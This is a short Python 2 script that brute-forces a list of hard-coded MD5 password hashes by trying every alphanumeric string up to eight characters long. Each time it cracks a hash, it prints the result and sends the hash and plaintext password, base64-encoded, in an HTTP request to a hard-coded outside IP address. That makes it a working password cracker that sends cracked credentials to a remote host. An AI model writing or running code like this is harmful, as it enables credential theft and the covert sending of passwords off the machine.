import itertools
import string
import hashlib
import string
import random
import base64
import requests
import urllib

#dict = {}

#def randomString(stringLength=10):
#    """Generate a random string of fixed length """
#    letters = string.ascii_lowercase
#    return ''.join(random.choice(letters) for i in range(stringLength))

#for ii in xrange(500000):
#dict[ii] = randomString(1000)

hashes = ['9d52e5647865b61ccee618e1375b3a54', '900150983cd24fb0d6963f7d28e17f72', 'e2fc714c4727ee9395f324cd2e7f331f', 'ab56b4d92b40713acc5af89985d4b786', 'e80b5017098950fc58aad83c8c14978e']
hashesToDo = len(hashes)
hashesDone = []

def doHash( password):
	m = hashlib.md5()
	m.update(password)
	
	return m.digest().encode('hex')

# https://stackoverflow.com/questions/40269605/how-to-create-a-bruteforce-password-cracker-for-alphabetical-and-alphanumerical
def guess_password():
	hashesToDo = len(hashes)
	#chars = string.ascii_lowercase + string.ascii_uppercase + string.digits + string.punctuation
	chars = string.ascii_lowercase + string.ascii_uppercase + string.digits
	#print len(chars)
	#chars = string.ascii_lowercase
	attempts = 0
	for password_length in range(1, 9):
		#print password_length
		for guess in itertools.product(chars, repeat=password_length):
			guess = ''.join(guess)
			if hashesToDo == 0:
				return
			for hash in hashes:
				calcHash = doHash( guess)
				if calcHash == hash:
					hashesToDo -= 1
					hashesDone.append( hash[0])
					print "%s %s" % (hash, guess)
					requests.get( "http://18.191.80.4/%s" % urllib.quote(base64.b64encode( "%s:%s" % (hash,guess))))

guess_password()